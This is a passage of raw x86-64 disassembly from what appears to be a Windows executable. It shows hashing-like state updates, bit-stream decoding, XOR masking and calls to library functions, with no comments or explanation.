   140054fbb:	movaps xmm1,XMMWORD PTR [rbp+0x720]
   140054fc2:	movaps xmm2,XMMWORD PTR [rbp+0x730]
   140054fc9:	movaps xmm3,XMMWORD PTR [rbp+0x740]
   140054fd0:	lea    rax,[rbp+0xf98]
   140054fd7:	movups XMMWORD PTR [rax+0x30],xmm3
   140054fdb:	movups XMMWORD PTR [rax+0x20],xmm2
   140054fdf:	movups XMMWORD PTR [rax+0x10],xmm1
   140054fe3:	movups XMMWORD PTR [rax],xmm0
   140054fe6:	call   0x140064214
   140054feb:	mov    al,BYTE PTR [rip+0x43a9c]        # 0x140098a8d
   140054ff1:	cmp    al,0x1
   140054ff3:	je     0x14005503c
   140054ff5:	movzx  eax,al
   140054ff8:	cmp    eax,0x2
   140054ffb:	je     0x1400550e2
   140055001:	and    DWORD PTR [rbp+0x3d0],0x0
   140055008:	lea    rcx,[rip+0xfffffffffffac071]        # 0x140001080
   14005500f:	mov    rdx,QWORD PTR [rbp+0x1150]
   140055016:	push   0x40
   140055018:	pop    r8
   14005501a:	lea    r9,[rbp+0x3d0]
   140055021:	call   QWORD PTR [rip+0x3f7e1]        # 0x140094808
   140055027:	test   eax,eax
   140055029:	sete   cl
   14005502c:	inc    cl
   14005502e:	mov    BYTE PTR [rip+0x43a59],cl        # 0x140098a8d
   140055034:	test   eax,eax
   140055036:	je     0x1400550e2
   14005503c:	mov    al,BYTE PTR [rip+0x43b76]        # 0x140098bb8
   140055042:	cmp    al,0x1
   140055044:	je     0x140055069
   140055046:	movzx  eax,al
   140055049:	test   eax,eax
   14005504b:	jne    0x1400550e2
   140055051:	call   0x140065d51
   140055056:	test   rax,rax
   140055059:	sete   cl
   14005505c:	inc    cl
   14005505e:	mov    BYTE PTR [rip+0x43b54],cl        # 0x140098bb8
   140055064:	test   rax,rax
   140055067:	je     0x1400550e2
   140055069:	call   0x140064227
   14005506e:	mov    eax,0xc8c291de
   140055073:	xchg   DWORD PTR [rip+0x43a67],eax        # 0x140098ae0
   140055079:	call   QWORD PTR [rip+0x3f5d1]        # 0x140094650
   14005507f:	mov    eax,eax
   140055081:	mov    QWORD PTR [rip+0x42f78],rax        # 0x140098000
   140055088:	lea    rcx,[rbp+0xf80]
   14005508f:	push   0xffffffffffffffff
   140055091:	pop    rdx
   140055092:	call   0x140010840
   140055097:	xor    eax,eax
   140055099:	xchg   DWORD PTR [rip+0x43a41],eax        # 0x140098ae0
   14005509f:	mov    BYTE PTR [rip+0x439e8],0x0        # 0x140098a8e
   1400550a6:	mov    eax,DWORD PTR [rbp+0xf80]
   1400550ac:	add    DWORD PTR [rbp+0x848],eax
   1400550b2:	mov    eax,DWORD PTR [rbp+0xf84]
   1400550b8:	add    DWORD PTR [rbp+0x84c],eax
   1400550be:	mov    eax,DWORD PTR [rbp+0xf88]
   1400550c4:	add    DWORD PTR [rbp+0x850],eax
   1400550ca:	mov    eax,DWORD PTR [rbp+0xf8c]
   1400550d0:	add    DWORD PTR [rbp+0x854],eax
   1400550d6:	mov    eax,DWORD PTR [rbp+0xf90]
   1400550dc:	add    DWORD PTR [rbp+0x858],eax
   1400550e2:	mov    BYTE PTR [rip+0x439a3],0x0        # 0x140098a8c
   1400550e9:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   1400550f0:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   1400550f7:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   1400550fe:	xor    eax,eax
   140055100:	cmp    rax,0x14
   140055104:	je     0x14005511c
   140055106:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   14005510d:	bswap  ecx
   14005510f:	mov    DWORD PTR [rbp+rax*1+0xf80],ecx
   140055116:	add    rax,0x4
   14005511a:	jmp    0x140055100
   14005511c:	mov    rax,QWORD PTR [rbp+0x7e0]
   140055123:	mov    QWORD PTR [rbp+0x1178],rax
   14005512a:	mov    eax,esi
   14005512c:	shr    eax,0x3
   14005512f:	and    eax,0x1f
   140055132:	lea    rcx,[rax+rbp*1]
   140055136:	add    rcx,0xf80
   14005513d:	xor    r8d,r8d
   140055140:	xor    edx,edx
   140055142:	xor    eax,eax
   140055144:	cmp    r8,0x10
   140055148:	je     0x140055163
   14005514a:	shld   rax,rdx,0x8
   14005514f:	mov    r9,rdx
   140055152:	shl    r9,0x8
   140055156:	movzx  edx,BYTE PTR [rcx+r8*1]
   14005515b:	inc    r8
   14005515e:	or     rdx,r9
   140055161:	jmp    0x140055144
   140055163:	push   0xffffffffffffffff
   140055165:	pop    r8
   140055167:	mov    r9,r8
   14005516a:	mov    r10,QWORD PTR [rbp+0x1178]
   140055171:	mov    ecx,r10d
   140055174:	shl    r9,cl
   140055177:	cmp    r10,0x40
   14005517b:	not    r9
   14005517e:	cmovae r9,r8
   140055182:	and    esi,0x7
   140055185:	lea    ecx,[r10+rsi*1]
   140055189:	neg    cl
   14005518b:	shrd   rdx,rax,cl
   14005518f:	shr    rax,cl
   140055192:	test   cl,0x40
   140055195:	cmove  rax,rdx
   140055199:	and    rax,r9
   14005519c:	mov    rbx,QWORD PTR [rbp+0x820]
   1400551a3:	add    r10,0x7
   1400551a7:	bswap  rax
   1400551aa:	shr    r10,0x3
   1400551ae:	mov    QWORD PTR [rbp+0x710],rax
   1400551b5:	mov    r8,rbx
   1400551b8:	imul   r8,r10
   1400551bc:	push   0x8
   1400551be:	pop    rcx
   1400551bf:	sub    rcx,r10
   1400551c2:	dec    r10
   1400551c5:	mov    rax,QWORD PTR [rbp+0x1158]
   1400551cc:	lea    r11,[rax+r8*1]
   1400551d0:	mov    rax,r8
   1400551d3:	xor    edx,edx
   1400551d5:	push   0x14
   1400551d7:	pop    rsi
   1400551d8:	div    rsi
   1400551db:	cmp    rcx,0x8
   1400551df:	je     0x140055205
   1400551e1:	cmp    r10,0x7
   1400551e5:	ja     0x140059d80
   1400551eb:	imul   rax,rax,0xffffffffffffffec
   1400551ef:	mov    al,BYTE PTR [r11+rax*1]
   1400551f3:	xor    BYTE PTR [rbp+rcx*1+0x710],al
   1400551fa:	inc    rcx
   1400551fd:	inc    r11
   140055200:	inc    r8
   140055203:	jmp    0x1400551d0
   140055205:	mov    rdx,QWORD PTR [rbp+0x710]
   14005520c:	bswap  rdx
   14005520f:	and    rdx,r9
   140055212:	inc    rbx
   140055215:	mov    QWORD PTR [rbp+0x820],rbx
   14005521c:	mov    rsi,QWORD PTR [rbp+0x890]
   140055223:	mov    r14,QWORD PTR [rbp+0x888]
   14005522a:	mov    rdi,QWORD PTR [rbp+0x880]
   140055231:	mov    r12,QWORD PTR [rbp+0x870]
   140055238:	mov    r15,QWORD PTR [rbp+0x878]
   14005523f:	mov    rax,rsi
   140055242:	sub    rax,r14
   140055245:	sub    rax,rdi
   140055248:	mov    r8,QWORD PTR [rbp+0x1178]
   14005524f:	cmp    rax,r8
   140055252:	cmovae rax,r8
   140055256:	cmp    rax,0x1
   14005525a:	adc    rax,0x0
   14005525e:	mov    ecx,r8d
   140055261:	sub    ecx,eax
   140055263:	and    cl,0x3f
   140055266:	cmp    r8,rax
   140055269:	movzx  ecx,cl
   14005526c:	mov    r8d,0x0
   140055272:	cmovbe ecx,r8d
   140055276:	shr    rdx,cl
   140055279:	mov    ecx,eax
   14005527b:	shld   r15,r12,cl
   14005527f:	shl    r12,cl
   140055282:	test   al,0x40
   140055284:	cmovne r15,r12
   140055288:	mov    ecx,0x0
   14005528d:	cmove  rcx,r12
   140055291:	or     rcx,rdx
   140055294:	mov    QWORD PTR [rbp+0x878],r15
   14005529b:	mov    QWORD PTR [rbp+0x870],rcx
   1400552a2:	add    rdi,rax
   1400552a5:	mov    QWORD PTR [rbp+0x880],rdi
   1400552ac:	mov    r12,rcx
   1400552af:	jmp    0x140054d5b
   1400552b4:	add    rdi,0xfffffffffffffff8
   1400552b8:	mov    rax,r12
   1400552bb:	mov    ecx,edi
   1400552bd:	shrd   rax,r15,cl
   1400552c1:	mov    rdx,r15
   1400552c4:	shr    rdx,cl
   1400552c7:	push   0xffffffffffffffff
   1400552c9:	pop    r9
   1400552cb:	mov    r8,r9
   1400552ce:	shl    r8,cl
   1400552d1:	test   dil,0x40
   1400552d5:	cmove  rdx,rax
   1400552d9:	mov    rax,r9
   1400552dc:	cmovne rax,r8
   1400552e0:	mov    ecx,0x0
   1400552e5:	cmove  rcx,r8
   1400552e9:	mov    QWORD PTR [rbp+0x880],rdi
   1400552f0:	not    rcx
   1400552f3:	not    rax
   1400552f6:	and    rax,r15
   1400552f9:	and    rcx,r12
   1400552fc:	test   rdi,rdi
   1400552ff:	cmove  rcx,rdi
   140055303:	cmove  rax,rdi
   140055307:	mov    QWORD PTR [rbp+0x878],rax
   14005530e:	mov    QWORD PTR [rbp+0x870],rcx
   140055315:	add    r14,0x8
   140055319:	mov    QWORD PTR [rbp+0x888],r14
   140055320:	mov    r12,rcx
   140055323:	mov    r15,rax
   140055326:	inc    r13
   140055329:	lea    rcx,[rbp+0x610]
   140055330:	call   0x14003c141
   140055335:	jmp    0x140054d3e
   14005533a:	mov    rcx,QWORD PTR [rbp+0x610]
   140055341:	mov    rdx,QWORD PTR [rbp+0x618]
   140055348:	call   0x14006f7f7
   14005534d:	mov    ecx,0xc8
   140055352:	lea    rdi,[rbp+0xf88]
   140055359:	lea    rsi,[rbp+0x7d8]
   140055360:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140055362:	mov    rax,QWORD PTR [rbp+0x1180]
   140055369:	mov    QWORD PTR [rbp+0xf80],rax
   140055370:	mov    rax,QWORD PTR [rbp+0xd0]
   140055377:	mov    QWORD PTR [rbp+0x1160],rax
   14005537e:	lea    rax,[rbp+0xd8]
   140055385:	movups xmm0,XMMWORD PTR [rax]
   140055388:	movups xmm1,XMMWORD PTR [rax+0x10]
   14005538c:	movaps XMMWORD PTR [rbp+0x610],xmm0
   140055393:	movaps XMMWORD PTR [rbp+0x620],xmm1
   14005539a:	mov    rax,QWORD PTR [rax+0x20]
   14005539e:	mov    QWORD PTR [rbp+0x630],rax
   1400553a5:	mov    edx,0x4000
   1400553aa:	lea    rcx,[rip+0x2e69f]        # 0x140083a50
   1400553b1:	call   0x14003bee8
   1400553b6:	mov    rbx,rax
   1400553b9:	lea    rcx,[rax+0x10]
   1400553bd:	sub    rdx,0x10
   1400553c1:	mov    QWORD PTR [rbp+0xf70],rdx
   1400553c8:	mov    eax,0x0
   1400553cd:	cmovae rax,rcx
   1400553d1:	mov    QWORD PTR [rbp+0x1178],rax
   1400553d8:	jb     0x14005a158
   1400553de:	mov    rax,QWORD PTR [rbp+0x1160]
   1400553e5:	add    rax,0xffffffffffffffbf
   1400553e9:	cmp    rax,0xffffffffffffffc0
   1400553ed:	jb     0x14005a158
   1400553f3:	cmp    QWORD PTR [rbp+0xf70],0x0
   1400553fb:	je     0x14005a158
   140055401:	mov    rcx,QWORD PTR [rbp+0x1158]
   140055408:	lea    rdx,[rbp+0x1e0]
   14005540f:	call   0x14003ad8d
   140055414:	lea    r14,[rbx+0x10]
   140055418:	mov    rcx,r14
   14005541b:	mov    rdi,QWORD PTR [rbp+0xf70]
   140055422:	mov    rdx,rdi
   140055425:	call   0x14003adcf
   14005542a:	mov    rsi,QWORD PTR [rbp+0x1160]
   140055431:	mul    rsi
   140055434:	mov    r8,rax
   140055437:	push   0xffffffffffffffff
   140055439:	pop    rax
   14005543a:	cmovo  r8,rax
   14005543e:	mov    rcx,r8
   140055441:	sub    rcx,0x20
   140055445:	mov    eax,0x0
   14005544a:	cmovb  rcx,rax
   14005544e:	mov    QWORD PTR [rbp+0x7a0],rcx
   140055455:	mov    QWORD PTR [rbp+0x7d0],r14
   14005545c:	mov    QWORD PTR [rbp+0x7d8],rdi
   140055463:	mov    QWORD PTR [rbp+0x7e0],rsi
   14005546a:	lea    rdx,[rbp+0xd8]
   140055471:	movups xmm0,XMMWORD PTR [rdx]
   140055474:	movups xmm1,XMMWORD PTR [rdx+0x10]
   140055478:	lea    rcx,[rbp+0x7e8]
   14005547f:	movups XMMWORD PTR [rcx],xmm0
   140055482:	movups XMMWORD PTR [rcx+0x10],xmm1
   140055486:	mov    rax,QWORD PTR [rdx+0x20]
   14005548a:	mov    QWORD PTR [rcx+0x20],rax
   14005548e:	lea    rcx,[rbp+0x7d8]
   140055495:	and    QWORD PTR [rcx+0x48],0x0
   14005549a:	movaps XMMWORD PTR [rcx+0x38],xmm7
   14005549e:	mov    QWORD PTR [rbp+0x828],rdi
   1400554a5:	mov    rax,QWORD PTR [rbp+0x600]
   1400554ac:	mov    QWORD PTR [rbp+0x830],rax
   1400554b3:	mov    rax,QWORD PTR [rbp+0x4f0]
   1400554ba:	mov    QWORD PTR [rbp+0x838],rax
   1400554c1:	mov    rax,QWORD PTR [rbp+0x7b8]
   1400554c8:	mov    QWORD PTR [rbp+0x840],rax
   1400554cf:	mov    eax,DWORD PTR [rbp+0x1f0]
   1400554d5:	mov    DWORD PTR [rcx+0x80],eax
   1400554db:	movaps xmm0,XMMWORD PTR [rbp+0x1e0]
   1400554e2:	movups XMMWORD PTR [rcx+0x70],xmm0
   1400554e6:	mov    rax,QWORD PTR [rbp+0xcb0]
   1400554ed:	movaps XMMWORD PTR [rax+0x10],xmm7
   1400554f1:	movaps XMMWORD PTR [rax],xmm7
   1400554f4:	mov    QWORD PTR [rbp+0x1148],r8
   1400554fb:	mov    QWORD PTR [rbp+0x890],r8
   140055502:	lea    rcx,[rbp+0x640]
   140055509:	push   0x4
   14005550b:	pop    rdx
   14005550c:	call   0x14003c111
   140055511:	xor    r15d,r15d
   140055514:	xor    edi,edi
   140055516:	xor    r12d,r12d
   140055519:	xor    r13d,r13d
   14005551c:	xor    r14d,r14d
   14005551f:	mov    QWORD PTR [rbp+0x1138],0x0
   14005552a:	cmp    QWORD PTR [rbp+0x1138],0x4
   140055532:	je     0x140055b29
   140055538:	lea    rax,[r14+0x8]
   14005553c:	cmp    rax,QWORD PTR [rbp+0x1148]
   140055543:	jbe    0x14005554c
   140055545:	xor    edx,edx
   140055547:	jmp    0x140055b11
   14005554c:	cmp    r13,0x8
   140055550:	jae    0x140055a9e
   140055556:	cmp    r15,QWORD PTR [rbp+0x828]
   14005555d:	jae    0x1400555a3
   14005555f:	mov    rax,QWORD PTR [rbp+0x7d8]
   140055566:	mov    rcx,QWORD PTR [rbp+0x818]
   14005556d:	cmp    rcx,rax
   140055570:	jae    0x1400555a3
   140055572:	lea    rdx,[rbx+0x10]
   140055576:	movzx  r13d,BYTE PTR [rdx+rcx*1]
   14005557b:	and    r13d,0x7f
   14005557f:	lea    rdx,[rcx+0x1]
   140055583:	cmp    rdx,rax
   140055586:	jae    0x1400555b0
   140055588:	movzx  r8d,BYTE PTR [rbx+rcx*1+0x11]
   14005558e:	test   r8b,r8b
   140055591:	jns    0x1400555aa
   140055593:	shl    r13,0x7
   140055597:	and    r8d,0x7f
   14005559b:	or     r13,r8
   14005559e:	mov    rcx,rdx
   1400555a1:	jmp    0x14005557f
   1400555a3:	xor    edx,edx
   1400555a5:	jmp    0x140055a2d
   1400555aa:	inc    rcx
   1400555ad:	mov    rax,rcx
   1400555b0:	mov    QWORD PTR [rbp+0x818],rax
   1400555b7:	mov    rax,r13
   1400555ba:	shr    rax,0x8
   1400555be:	mov    rsi,r13
   1400555c1:	shr    rsi,0x28
   1400555c5:	movaps XMMWORD PTR [rbp+0xcf0],xmm7
   1400555cc:	movaps XMMWORD PTR [rbp+0xce0],xmm7
   1400555d3:	movaps XMMWORD PTR [rbp+0xcd0],xmm7
   1400555da:	movaps XMMWORD PTR [rbp+0xcc0],xmm7
   1400555e1:	mov    DWORD PTR [rbp+0x1060],eax
   1400555e7:	lea    rax,[rip+0x32a6a]        # 0x140088058
   1400555ee:	mov    QWORD PTR [rsp+0x20],rax
   1400555f3:	lea    rcx,[rbp+0xcc0]
   1400555fa:	push   0x4
   1400555fc:	pop    rdx
   1400555fd:	lea    r8,[rbp+0x1060]
   140055604:	mov    r9,rdx
   140055607:	call   0x1400638fe
   14005560c:	mov    BYTE PTR [rbp+0xcc4],sil
   140055613:	mov    rsi,QWORD PTR [rbp+0x7f0]
   14005561a:	cmp    QWORD PTR [rbp+0x838],rsi
   140055621:	jbe    0x14005574d
   140055627:	mov    r9,QWORD PTR [rbp+0x7f8]
   14005562e:	cmp    r9,0x4
   140055632:	ja     0x140059d9c
   140055638:	mov    rcx,QWORD PTR [rbp+0x800]
   14005563f:	cmp    rcx,0x5
   140055643:	jae    0x140059dae
   140055649:	mov    r14,QWORD PTR [rbp+0x838]
   140055650:	cmp    r14,rsi
   140055653:	je     0x140059dbc
   140055659:	mov    r8,r14
   14005565c:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   140055663:	mov    cl,BYTE PTR [rbp+0x808]
   140055669:	rol    eax,cl
   14005566b:	sub    r8,rsi
   14005566e:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   140055676:	xor    edx,edx
   140055678:	div    r8
   14005567b:	mov    rdi,rdx
   14005567e:	mov    rax,QWORD PTR [rbp+0x840]
   140055685:	mov    QWORD PTR [rbp+0x710],rax
   14005568c:	cmp    rsi,0x40
   140055690:	push   0x40
   140055692:	pop    rax
   140055693:	cmovae rsi,rax
   140055697:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14005569e:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   1400556a5:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   1400556ac:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   1400556b3:	lea    rcx,[rbp+0x1060]
   1400556ba:	mov    rdx,rsi
   1400556bd:	call   0x14003c0b8
   1400556c2:	test   r14,r14
   1400556c5:	je     0x140055713
   1400556c7:	mov    rcx,rax
   1400556ca:	mov    r8,rdx
   1400556cd:	mov    rax,rdx
   1400556d0:	add    rax,rdi
   1400556d3:	mov    r9,QWORD PTR [rbp+0x830]
   1400556da:	cmp    rax,r14
   1400556dd:	jbe    0x1400556fd
   1400556df:	xor    r10d,r10d
   1400556e2:	cmp    r8,r10
   1400556e5:	je     0x140055713
   1400556e7:	lea    rax,[r10+rdi*1]
   1400556eb:	xor    edx,edx
   1400556ed:	div    r14
   1400556f0:	mov    al,BYTE PTR [r9+rdx*1]
   1400556f4:	mov    BYTE PTR [rcx+r10*1],al
   1400556f8:	inc    r10
   1400556fb:	jmp    0x1400556e2
   1400556fd:	add    r9,rdi
   140055700:	xor    eax,eax
   140055702:	cmp    r8,rax
   140055705:	je     0x140055713
   140055707:	mov    dl,BYTE PTR [r9+rax*1]
   14005570b:	mov    BYTE PTR [rcx+rax*1],dl
   14005570e:	inc    rax
   140055711:	jmp    0x140055702
   140055713:	mov    rcx,QWORD PTR [rbp+0x7e8]
   14005571a:	xor    eax,eax
   14005571c:	cmp    rsi,rax
   14005571f:	je     0x14005574d
   140055721:	cmp    rcx,0x3f
   140055725:	ja     0x140059d8e
   14005572b:	mov    edx,eax
   14005572d:	and    edx,0x7
   140055730:	mov    dl,BYTE PTR [rbp+rdx*1+0x710]
   140055737:	xor    dl,BYTE PTR [rbp+rax*1+0x1060]
   14005573e:	inc    rax
   140055741:	mov    BYTE PTR [rbp+rcx*1+0xcc0],dl
   140055748:	inc    rcx
   14005574b:	jmp    0x14005571c
   14005574d:	movaps XMMWORD PTR [rbp+0x740],xmm7
   140055754:	movaps XMMWORD PTR [rbp+0x730],xmm7
   14005575b:	movaps XMMWORD PTR [rbp+0x720],xmm7
   140055762:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140055769:	xor    eax,eax
   14005576b:	cmp    rax,0x40
   14005576f:	je     0x140055787
   140055771:	mov    ecx,DWORD PTR [rbp+rax*1+0xcc0]
   140055778:	bswap  ecx
   14005577a:	mov    DWORD PTR [rbp+rax*1+0x710],ecx
   140055781:	add    rax,0x4
   140055785:	jmp    0x14005576b
   140055787:	movups xmm0,XMMWORD PTR [rbp+0x848]
   14005578e:	mov    eax,DWORD PTR [rbp+0x858]
   140055794:	movups XMMWORD PTR [rbp+0x1060],xmm0
   14005579b:	mov    DWORD PTR [rbp+0x1070],eax
   1400557a1:	and    DWORD PTR [rbp+0x1074],0x0
   1400557a8:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   1400557af:	movaps xmm1,XMMWORD PTR [rbp+0x720]
   1400557b6:	movaps xmm2,XMMWORD PTR [rbp+0x730]
   1400557bd:	movaps xmm3,XMMWORD PTR [rbp+0x740]
   1400557c4:	lea    rax,[rbp+0x1078]
   1400557cb:	movups XMMWORD PTR [rax+0x30],xmm3
   1400557cf:	movups XMMWORD PTR [rax+0x20],xmm2
   1400557d3:	movups XMMWORD PTR [rax+0x10],xmm1
   1400557d7:	movups XMMWORD PTR [rax],xmm0
   1400557da:	call   0x140064214
   1400557df:	mov    al,BYTE PTR [rip+0x432a8]        # 0x140098a8d
   1400557e5:	cmp    al,0x1
   1400557e7:	je     0x140055830
   1400557e9:	movzx  eax,al
   1400557ec:	cmp    eax,0x2
   1400557ef:	je     0x1400558d6
   1400557f5:	and    DWORD PTR [rbp+0x680],0x0
   1400557fc:	lea    rcx,[rip+0xfffffffffffab87d]        # 0x140001080
   140055803:	mov    rdx,QWORD PTR [rbp+0x1150]
   14005580a:	push   0x40
   14005580c:	pop    r8
   14005580e:	lea    r9,[rbp+0x680]
   140055815:	call   QWORD PTR [rip+0x3efed]        # 0x140094808
   14005581b:	test   eax,eax
   14005581d:	sete   cl
   140055820:	inc    cl
   140055822:	mov    BYTE PTR [rip+0x43265],cl        # 0x140098a8d
   140055828:	test   eax,eax
   14005582a:	je     0x1400558d6
   140055830:	mov    al,BYTE PTR [rip+0x43382]        # 0x140098bb8
   140055836:	cmp    al,0x1
   140055838:	je     0x14005585d
   14005583a:	movzx  eax,al
   14005583d:	test   eax,eax
   14005583f:	jne    0x1400558d6
   140055845:	call   0x140065d51
   14005584a:	test   rax,rax
   14005584d:	sete   cl
   140055850:	inc    cl
   140055852:	mov    BYTE PTR [rip+0x43360],cl        # 0x140098bb8
   140055858:	test   rax,rax
   14005585b:	je     0x1400558d6
   14005585d:	call   0x140064227
   140055862:	mov    eax,0xc8c291de
   140055867:	xchg   DWORD PTR [rip+0x43273],eax        # 0x140098ae0
   14005586d:	call   QWORD PTR [rip+0x3eddd]        # 0x140094650
   140055873:	mov    eax,eax
   140055875:	mov    QWORD PTR [rip+0x42784],rax        # 0x140098000
   14005587c:	lea    rcx,[rbp+0x1060]
   140055883:	push   0xffffffffffffffff
   140055885:	pop    rdx
   140055886:	call   0x14002b840
   14005588b:	xor    eax,eax
   14005588d:	xchg   DWORD PTR [rip+0x4324d],eax        # 0x140098ae0
   140055893:	mov    BYTE PTR [rip+0x431f4],0x0        # 0x140098a8e
   14005589a:	mov    eax,DWORD PTR [rbp+0x1060]
   1400558a0:	add    DWORD PTR [rbp+0x848],eax
   1400558a6:	mov    eax,DWORD PTR [rbp+0x1064]
   1400558ac:	add    DWORD PTR [rbp+0x84c],eax
   1400558b2:	mov    eax,DWORD PTR [rbp+0x1068]
   1400558b8:	add    DWORD PTR [rbp+0x850],eax
   1400558be:	mov    eax,DWORD PTR [rbp+0x106c]
   1400558c4:	add    DWORD PTR [rbp+0x854],eax
   1400558ca:	mov    eax,DWORD PTR [rbp+0x1070]
   1400558d0:	add    DWORD PTR [rbp+0x858],eax
   1400558d6:	mov    BYTE PTR [rip+0x431af],0x0        # 0x140098a8c
   1400558dd:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   1400558e4:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   1400558eb:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   1400558f2:	xor    eax,eax
   1400558f4:	cmp    rax,0x14
   1400558f8:	je     0x140055910
   1400558fa:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   140055901:	bswap  ecx
   140055903:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14005590a:	add    rax,0x4
   14005590e:	jmp    0x1400558f4
   140055910:	mov    rsi,QWORD PTR [rbp+0x7e0]
   140055917:	mov    eax,r13d
   14005591a:	shr    eax,0x3
   14005591d:	and    eax,0x1f
   140055920:	lea    rcx,[rax+rbp*1]
   140055924:	add    rcx,0x1060
   14005592b:	xor    r8d,r8d
   14005592e:	xor    edx,edx
   140055930:	xor    eax,eax
   140055932:	cmp    r8,0x10
   140055936:	je     0x140055951
   140055938:	shld   rax,rdx,0x8
   14005593d:	mov    r9,rdx
   140055940:	shl    r9,0x8
   140055944:	movzx  edx,BYTE PTR [rcx+r8*1]
   140055949:	inc    r8
   14005594c:	or     rdx,r9
   14005594f:	jmp    0x140055932
   140055951:	push   0xffffffffffffffff
   140055953:	pop    r8
   140055955:	mov    r9,r8
   140055958:	mov    ecx,esi
   14005595a:	shl    r9,cl
   14005595d:	cmp    rsi,0x40
   140055961:	not    r9
   140055964:	cmovae r9,r8
   140055968:	and    r13d,0x7
   14005596c:	lea    ecx,[rsi+r13*1]
   140055970:	neg    cl
   140055972:	shrd   rdx,rax,cl
   140055976:	shr    rax,cl
   140055979:	test   cl,0x40
   14005597c:	cmove  rax,rdx
   140055980:	and    rax,r9
   140055983:	mov    r15,QWORD PTR [rbp+0x820]
   14005598a:	lea    r10,[rsi+0x7]
   14005598e:	bswap  rax
   140055991:	shr    r10,0x3
   140055995:	mov    QWORD PTR [rbp+0x710],rax
   14005599c:	mov    r8,r15
   14005599f:	imul   r8,r10
   1400559a3:	push   0x8
   1400559a5:	pop    rcx
   1400559a6:	sub    rcx,r10
   1400559a9:	dec    r10
   1400559ac:	mov    rax,QWORD PTR [rbp+0x1158]
   1400559b3:	lea    r11,[rax+r8*1]
   1400559b7:	mov    rax,r8
   1400559ba:	xor    edx,edx
   1400559bc:	push   0x14
   1400559be:	pop    rdi
   1400559bf:	div    rdi
   1400559c2:	cmp    rcx,0x8
   1400559c6:	je     0x1400559ec
   1400559c8:	cmp    r10,0x7
   1400559cc:	ja     0x140059d80
   1400559d2:	imul   rax,rax,0xffffffffffffffec
   1400559d6:	mov    al,BYTE PTR [r11+rax*1]
   1400559da:	xor    BYTE PTR [rbp+rcx*1+0x710],al
   1400559e1:	inc    rcx
   1400559e4:	inc    r11
   1400559e7:	inc    r8
   1400559ea:	jmp    0x1400559b7
   1400559ec:	mov    rdx,QWORD PTR [rbp+0x710]
   1400559f3:	bswap  rdx
   1400559f6:	and    rdx,r9
   1400559f9:	inc    r15
   1400559fc:	mov    QWORD PTR [rbp+0x820],r15
   140055a03:	mov    rax,QWORD PTR [rbp+0x890]
   140055a0a:	mov    QWORD PTR [rbp+0x1148],rax
   140055a11:	mov    r14,QWORD PTR [rbp+0x888]
   140055a18:	mov    r13,QWORD PTR [rbp+0x880]
   140055a1f:	mov    rdi,QWORD PTR [rbp+0x870]
   140055a26:	mov    r12,QWORD PTR [rbp+0x878]
   140055a2d:	mov    rax,QWORD PTR [rbp+0x1148]
   140055a34:	sub    rax,r14
   140055a37:	sub    rax,r13
   140055a3a:	cmp    rax,rsi
   140055a3d:	cmovae rax,rsi
   140055a41:	cmp    rax,0x1
   140055a45:	adc    rax,0x0
   140055a49:	mov    ecx,esi
   140055a4b:	sub    ecx,eax
   140055a4d:	and    cl,0x3f
   140055a50:	cmp    rsi,rax
   140055a53:	movzx  ecx,cl
   140055a56:	mov    r8d,0x0
   140055a5c:	cmovbe ecx,r8d
   140055a60:	shr    rdx,cl
   140055a63:	mov    ecx,eax
   140055a65:	shld   r12,rdi,cl
   140055a69:	shl    rdi,cl
   140055a6c:	test   al,0x40
   140055a6e:	cmovne r12,rdi
   140055a72:	mov    ecx,0x0
   140055a77:	cmove  rcx,rdi
   140055a7b:	or     rcx,rdx
   140055a7e:	mov    QWORD PTR [rbp+0x878],r12
   140055a85:	mov    QWORD PTR [rbp+0x870],rcx
   140055a8c:	add    r13,rax
   140055a8f:	mov    QWORD PTR [rbp+0x880],r13
   140055a96:	mov    rdi,rcx
   140055a99:	jmp    0x14005554c
   140055a9e:	add    r13,0xfffffffffffffff8
   140055aa2:	mov    rax,rdi
   140055aa5:	mov    ecx,r13d
   140055aa8:	shrd   rax,r12,cl
   140055aac:	mov    rdx,r12
   140055aaf:	shr    rdx,cl
   140055ab2:	push   0xffffffffffffffff
   140055ab4:	pop    r9
   140055ab6:	mov    r8,r9
   140055ab9:	shl    r8,cl
   140055abc:	test   r13b,0x40
   140055ac0:	cmove  rdx,rax
   140055ac4:	mov    rax,r9
   140055ac7:	cmovne rax,r8
   140055acb:	mov    ecx,0x0
   140055ad0:	cmove  rcx,r8
   140055ad4:	mov    QWORD PTR [rbp+0x880],r13
   140055adb:	not    rcx
   140055ade:	not    rax
   140055ae1:	and    rax,r12
   140055ae4:	and    rcx,rdi
   140055ae7:	test   r13,r13
   140055aea:	cmove  rcx,r13
   140055aee:	cmove  rax,r13
   140055af2:	mov    QWORD PTR [rbp+0x878],rax
   140055af9:	mov    QWORD PTR [rbp+0x870],rcx
   140055b00:	add    r14,0x8
   140055b04:	mov    QWORD PTR [rbp+0x888],r14
   140055b0b:	mov    rdi,rcx
   140055b0e:	mov    r12,rax
   140055b11:	inc    QWORD PTR [rbp+0x1138]
   140055b18:	lea    rcx,[rbp+0x640]
   140055b1f:	call   0x14003c141
   140055b24:	jmp    0x14005552a
   140055b29:	mov    r12,QWORD PTR [rbp+0x640]
   140055b30:	mov    r13,QWORD PTR [rbp+0x648]
   140055b37:	mov    rdi,QWORD PTR [rbp+0x650]
   140055b3e:	mov    rcx,r13
   140055b41:	mov    rdx,rdi
   140055b44:	xor    r8d,r8d
   140055b47:	lea    r9,[rip+0x324aa]        # 0x140087ff8
   140055b4e:	call   0x14003c1d3
   140055b53:	movzx  r14d,BYTE PTR [rax]
   140055b57:	mov    rcx,r13
